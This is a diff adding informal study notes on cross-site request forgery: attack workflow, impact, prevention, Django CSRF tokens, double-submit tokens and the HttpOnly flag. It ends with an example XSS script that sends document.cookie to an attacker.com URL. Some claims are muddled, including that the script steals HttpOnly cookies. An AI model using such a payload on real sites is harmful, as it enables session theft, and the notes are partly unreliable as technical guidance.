@@ -3,3 +3,112 @@
 
 csrf also known as xsrf,sea surf or session riding is an attack vector that tricks a web browser into executing an unwanted action 
 in an application to which a user is logged in.
+CSRFs are typically conducted using malicious social engineering, such as an email or link that tricks the victim into sending a 
+forged request to a server. As the unsuspecting user is authenticated by their application at the time of the attack, it’s impossible 
+to distinguish a legitimate request from a forged one.
+
+NOTE :- cross site request forgery does not involves cookie stealing..
+
+IMPACT := 
+a) damaged client relationship
+b) unauthorised fund transer
+c) settings updation/password change which can lead to complete account compromise
+d) data theft (can be stealing persistent session cookie)
+
+=> csrf are typically conducting using malicious social engineering such as an email or link that tricks the victim into 
+   sending a forged req to a server..
+
+                                            ................. WORKFLOW...............
+
+a) let a client is authenticated with the bank website (banks website cookie is now stored in victims browser)
+b) attacker embeds the req into a hyperlink including some scripts and sends it to victim.
+c) victim clicks the link unknowingly sending the req to bank server.
+d) banks website validates the req and transfers the funds from the visitors account to the attacker..
+
+
+
+The risk inherent in this mechanism is that attackers can easily impersonate the user. Once a user passes the site’s identity verification, 
+the site cannot differentiate between a forged request and a legitimate user request.
+
+In a CSRF attack, an attacker assumes the victim’s identity, and uses it to perform actions on behalf of the user, without their consent. 
+Attackers typically follow this process:
+
+They use social engineering techniques to persuade the victim to click a link via email, chat message, or similar form of communication.
+Either the malicious link itself, or a web page the user visits, triggers a request to the targeted site
+The request supposedly comes from the user, and takes advantage of the fact that the user is already signed into the website.
+The website acknowledges the request and performs the attacker’s requested action, without the user’s knowledge or consent.
+CSRF attacks typically attempt to change server state, but can also be used to gain access to sensitive data. 
+If an attacker successfully performs a CSRF attack against the victim’s account, they can transfer funds, purchase a product, 
+modify account information such as the shipping address, modify the password, or any other action available when the user is signed in.
+
+
+If the malicious website automatically submits the form when the page is loaded, the malicious user only needs to lure an unsuspecting user of 
+your application to visit their website and their email address will be changed in your application.
+
+To prevent this vulnerability, we need to inspect every incoming POST, PUT, PATCH, or DELETE request for a secret session value that 
+the malicious application is unable to access.
+
+                                           <... PREVENTION...>
+
+i)   Preventing CSRF requires the inclusion of an unpredictable token in the body or URL of each HTTP request. 
+ii)  Such tokens should at a minimum be unique per user session, but can also be unique per request.
+iii) The preferred option is to include the unique token in a hidden field. The unique token can also be included in the URL itself, 
+     or a URL parameter.
+iv)  Check Referrer field of each request.
+v)   Use Captcha on all critical page.
+
+
+   =========================================================CSRF TOKEN=================================================================
+CSRF attacks exploit the trust between a web application and its authenticated users. An attacker tricks a victim into performing 
+unintended actions such as man-in-the-middle attack on the application by forging requests. Django utilizes CSRF tokens to combat with this 
+thread. A CSRF token is a unique and random value associated with a user’s session that is required for every non-safe HTTP request (POST, PUT, DELETE).
+
+WORKING :::::::------
+
+a) when a user visits a site the server creates a token and embeds it in users session
+b) The server sends the token to the client usually as cookie or hidden form field
+c) when the user submits a form and perfoms any non-safe option (put,delete,update) the token 
+   is embedded in the req.
+d) The server verifies the submitted token with the one stored in the server session if they match
+   the req is granted else 401 res is sent back to user.
+
+WHAT IF ATTACKER STEALS THE CSRF TOKEN ... HENCE SOME WEBSITES EMPLOYEE DOUBLE SUBMMITING TOKENS
+
+DOUBLE SUBBMITTING THE TOKEN :::::: ---------------------
+
+Double-submitting the token is a technique used to enhance the CSRF protection, since attackers’ forging area is generally 
+the request body and they ignore the headers. By requiring the token to be present and matching in two separate locations, 
+the form and the custom header, the double-submitting technique adds an extra layer of protection against CSRF attacks. 
+Even if an attacker manages to forge a request and includes the token in the form data, they would still need to guess or 
+obtain the same token value for the custom header, which is (a bit) more challenging, because now the attack will need more 
+time to handle that. It involves sending the token in two separate ways within a request to provide an additional layer of 
+defense against CSRF attacks. Django also has CSRF double submit protection. handled:
+
+When generating the HTML form, the server includes the CSRF token as a hidden input field within the form, as usual.
+In addition to the CSRF token within the form, the server also includes the same token in a different location, 
+typically within a custom HTTP header.When the client submits the form or performs a non-safe request, both the 
+form data and the custom HTTP header are sent to the server.
+On the server side, the CSRF protection mechanism checks for the presence of the token in both the form data and the custom header.
+The server then compares the token values from the two locations. 
+If the tokens match, the request is considered valid and is processed further.
+
+
+HttpOnly flag ::::: ++++++++ 
+The HttpOnly attribute is primarily designed to mitigate the risk of client-side script accessing a cookie’s value, such as CSRF token. 
+It prevents JavaScript code from accessing cookies marked as HttpOnly aiming to thwart attacks like session theft through client-side 
+script execution.
+The HttpOnly flag is a security feature that helps to protect sensitive information stored in cookies from being accessed by JavaScript. 
+This can help to prevent Cross-Site Scripting (XSS) attacks, where an attacker can inject malicious JavaScript code into a website that 
+can then be executed by the victim’s browser.
+HttpOnly flag is explained as “The HttpOnly cookie attribute instructs web browsers not to allow scripts (e.g. JavaScript or VBscript) 
+an ability to access the cookies via the DOM document.cookie object.” in OWASP cheatsheet.
+
+BUt in certain scenario httpOnly flag degrades the performance because in real world scenarios we need to authenticate 3rd party
+hence double submitting the token is better option but it always depends upon the use case..
+
+an example scenario, forging this script in a field in an address form and stealing the user cookie… :
+<script>
+  // Malicious script to steal HttpOnly cookies
+  var stolenCookies = document.cookie;
+  new Image().src = 'https://attacker.com/steal?cookies=' + encodeURIComponent(stolenCookies);
+</script>
